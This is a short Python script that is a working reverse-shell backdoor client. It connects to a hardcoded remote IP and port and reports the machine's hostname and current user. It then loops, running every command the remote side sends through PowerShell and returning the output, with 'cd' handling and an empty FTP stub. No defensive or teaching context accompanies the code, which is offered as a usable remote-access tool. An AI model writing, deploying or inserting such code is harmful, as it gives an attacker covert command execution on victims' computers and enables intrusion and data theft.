import socket
import os
import subprocess
import getpass

HOST = "192.168.30.52"
PORT = 6565




def first_connect(client):
    client.send(socket.gethostname().encode('utf-8'))
    answer = client.recv(1024).decode("utf-8")
    if answer == "whoareyou":
        client.send(getpass.getuser().encode("utf-8"))
    else :
        print("hello")


def connect():
    while 1:
        pwd = os.getcwd()
        client.send(pwd.encode('utf-8'))
        response = client.recv(40960)
        command = response.decode('utf-8')
        if command.split(" ")[0] == "cd":
            os.chdir(command.split(" ")[1])
        elif command == 'close':
            client.send(b"\033[32m[*] Connection closed !!!\033[0m\n")
            break
        stdout = subprocess.check_output(["powershell", "-Command",command])

        if stdout:
            client.send(stdout)
        else:
            client.send(b"\n")
    

def ftp():
    True



client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
first_connect(client)
while 1:
    command = client.recv(40960).decode("utf-8")
    match command:
            case "connect":
                connect()
            case "ftp":
                ftp()
            case "exit":
                client.close()
                break

